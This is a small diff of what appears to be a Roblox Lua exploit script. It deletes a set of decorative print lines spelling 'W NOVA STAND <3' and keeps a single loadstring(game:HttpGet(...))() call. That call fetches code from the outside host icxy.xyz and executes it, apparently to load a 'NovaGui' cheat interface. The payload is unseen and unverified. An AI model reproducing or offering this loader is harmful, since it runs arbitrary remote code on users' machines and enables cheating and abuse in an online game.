@@ -20,24 +20,6 @@
 
 
 
-
-print("W")
-print(" ")
-print("N")
-print("O")
-print("V")
-print("A")
-print(" ")
-print("S")
-print("T")
-print("A")
-print("N")
-print("D")
-print("<3")
-
-
-
-
 loadstring(game:HttpGet("https://icxy.xyz/NovaGui/CreateAScript", true))()
 
 
